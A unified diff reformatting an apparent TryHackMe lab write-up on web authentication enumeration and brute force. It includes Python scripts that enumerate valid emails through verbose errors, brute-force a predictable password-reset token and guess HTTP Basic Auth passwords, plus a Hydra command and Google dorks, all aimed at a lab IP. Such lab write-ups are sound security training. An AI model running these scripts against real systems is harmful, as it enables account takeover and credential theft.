@@ -19,16 +19,20 @@ In this post, I document my journey through the **Enumeration & Brute Force** la
 Authentication enumeration occurs when a web application reveals whether a username exists or not based on the error message returned.
 
 ### The Concept: Verbose Errors
+
 A secure application should return generic messages like *"Invalid username or password"*. However, vulnerable applications are "chatty":
-* **Invalid Username:** Returns "User does not exist".
-* **Valid Username:** Returns "Invalid password".
+
+- **Invalid Username:** Returns "User does not exist".
+- **Valid Username:** Returns "Invalid password".
 
 This difference allows us to build a list of valid users before even guessing passwords.
 
 ![](/assets/img/1-burp-intruder.png)
+
 *Fig 1: Burp Suite Intruder showing different response lengths for valid vs invalid users.*
 
 ### Automation: High-Speed User Enum Script
+
 Instead of relying on the slow community version of Burp Suite, I wrote a multi-threaded Python script that checks valid emails by analyzing the response.
 
 ```python
@@ -36,11 +40,9 @@ import requests
 import sys
 from concurrent.futures import ThreadPoolExecutor
 
-# Optimization: Using Session to reuse TCP connections
 s = requests.Session()
 
 def check_email(email):
-    # Direct IP connection to bypass DNS issues
     url = "http://10.80.136.172/labs/verbose_login/functions.php"
     headers = {
         'Host': 'enum.thm',
@@ -48,19 +50,17 @@ def check_email(email):
         'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
     }
     data = {'username': email, 'password': 'password', 'function': 'login'}
-    
+
     try:
         response = s.post(url, headers=headers, data=data, timeout=5)
         response_json = response.json()
-        
-        # Logic: If the error is NOT "Email does not exist", then the email is VALID.
+
         if 'Email does not exist' not in response_json['message']:
             print(f"\n[+] 🔥 BOOM! VALID FOUND: {email}")
             with open("valid_emails.txt", "a") as f:
                 f.write(email + "\n")
         else:
             print(".", end="", flush=True)
-            
     except Exception:
         pass
 
@@ -68,7 +68,7 @@ def main():
     if len(sys.argv) != 2:
         print("Usage: python3 fast_enum.py <email_list>")
         sys.exit(1)
-        
+
     email_file = sys.argv[1]
     with open(email_file, 'r') as file:
         emails = [line.strip() for line in file.readlines() if line.strip()]
@@ -79,20 +79,25 @@ def main():
 
 if __name__ == "__main__":
     main()
-```
+````
+
 ## 2. Exploiting Predictable Tokens
 
-Password reset tokens should be long, random, and complex. However, some developers use weak random number generators (e.g., mt_rand(100, 200)), making the token predictable and easy to brute force.
-The Vulnerability
+Password reset tokens should be long, random, and complex. However, some developers use weak random number generators (e.g., `mt_rand(100, 200)`), making the token predictable and easy to brute force.
 
-If the reset link looks like reset_password.php?token=123, an attacker can request a reset for an admin account and simply brute-force the token parameter (000-999) to hijack the account.
+### The Vulnerability
+
+If the reset link looks like `reset_password.php?token=123`, an attacker can request a reset for an admin account and brute-force the token parameter (000–999) to hijack the account.
+
 ![](/assets/img/2-reset-token.png)
-Fig 2: The vulnerable URL structure showing the simple token parameter.
-Automation: Token Breaker Script
 
-Since the range is small, this script finds the correct token in seconds by looking for a response size anomaly (Valid token = Larger page size).
-```Python
+*Fig 2: The vulnerable URL structure showing the simple token parameter.*
 
+### Automation: Token Breaker Script
+
+Since the range is small, this script finds the correct token in seconds by looking for a response size anomaly.
+
+```python
 import requests
 from concurrent.futures import ThreadPoolExecutor
 import os
@@ -106,18 +111,16 @@ FAILURE_TEXT = "Invalid token"
 def check_token(token_value):
     params = {PARAM_NAME: token_value}
     headers = {'Host': HOST_HEADER}
-    
+
     try:
         response = requests.get(BASE_URL, params=params, headers=headers, timeout=5)
-        
-        # If the failure text is NOT present, we found the token
+
         if FAILURE_TEXT not in response.text:
             print(f"\n[+] 🔥 BOOM! Valid Token Found: {token_value}")
             print(f"[+] Link: {BASE_URL}?{PARAM_NAME}={token_value}")
-            
-            # Preview the page to confirm access
+
             if "password" in response.text.lower():
-                 print("✅ CONFIRMED: Found 'password' field in HTML!")
+                print("✅ CONFIRMED: Found 'password' field in HTML!")
             os._exit(0)
         else:
             print(".", end="", flush=True)
@@ -126,32 +129,37 @@ def check_token(token_value):
 
 def main():
     print("[*] Brute Forcing Token...")
-    tokens_list = range(100, 201) # Example range
+    tokens_list = range(100, 201)
     with ThreadPoolExecutor(max_workers=20) as executor:
         executor.map(check_token, tokens_list)
 
 if __name__ == "__main__":
     main()
 ```
+
 ## 3. HTTP Basic Authentication
 
-Basic Auth transmits credentials as a Base64 encoded string (Authorization: Basic user:pass). While simple, it's vulnerable to brute force attacks if weak passwords are used.
+Basic Auth transmits credentials as a Base64 encoded string (`Authorization: Basic user:pass`). While simple, it's vulnerable to brute force attacks if weak passwords are used.
+
 ![](/assets/img/3-basic-auth.png)
-Fig 3: The browser prompt requesting Basic Authentication credentials.
-Tool 1: Hydra (The Standard)
 
-Hydra is the go-to tool for this. Important Note: Always check the path! A wrong path (e.g., /lab/ instead of /labs/) can lead to false positives.
-```Bash
+*Fig 3: The browser prompt requesting Basic Authentication credentials.*
 
+### Tool 1: Hydra (The Standard)
+
+Hydra is the go-to tool for this. Always verify the path to avoid false positives.
+
+```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.80.136.172 http-get /labs/basic_auth/ -f -vV
 ```
+
 ![](/assets/img/4-hydra-crack.png)
-Fig 4: Hydra successfully cracking the password.
-Tool 2: Universal Python Script
 
-I also created a script to handle the Base64 encoding automatically without needing Burp Intruder's payload processing rules.
-```Python
+*Fig 4: Hydra successfully cracking the password.*
 
+### Tool 2: Universal Python Script
+
+```python
 import requests
 import base64
 import sys
@@ -162,12 +170,10 @@ TARGET_URL = "http://10.80.136.172/labs/basic_auth/"
 USERNAME = "admin"
 
 def try_login(password):
-    # Auto-encode credentials to Base64
     creds = f"{USERNAME}:{password}"
     b64_creds = base64.b64encode(creds.encode()).decode()
-    
     headers = {'Authorization': f'Basic {b64_creds}'}
-    
+
     try:
         response = requests.get(TARGET_URL, headers=headers, timeout=5)
         if response.status_code == 200:
@@ -175,27 +181,29 @@ def try_login(password):
             os._exit(0)
     except:
         pass
-# ... (Threading logic is same as previous scripts)
 ```
+
 ## 4. Passive Reconnaissance
 
 Before touching the server, we can find hidden gems using:
+
 ```
-    Wayback Machine: Using waybackurls to find old endpoints like login_old.php.
-
-    Google Dorks: Using search operators to find exposed files.
-
-        site:target.com filetype:log
-
-        site:target.com inurl:admin
+Wayback Machine: login_old.php
+Google Dorks:
+site:target.com filetype:log
+site:target.com inurl:admin
 ```
+
 ![](/assets/img/5-google-dorks.png)
-Fig 5: Using passive reconnaissance tools to find hidden endpoints.
+
+*Fig 5: Using passive reconnaissance tools to find hidden endpoints.*
+
 ## Conclusion
 
 Enumeration is not just about running tools; it's about understanding the application's logic. By combining manual verification with custom scripting (Python/Bash), we can overcome the limitations of standard tools and conduct more efficient security assessments.
-Here is a visual mind-map summarizing the tools and techniques we used in this lab:
+
 ![](/assets/img/6-summary-cheatsheet.png)
-Fig 6: A complete mind-map for Web Enumeration & Brute Force Strategy.
+
+*Fig 6: A complete mind-map for Web Enumeration & Brute Force Strategy.*
 
 Disclaimer: This post is for educational purposes only based on a TryHackMe lab environment.
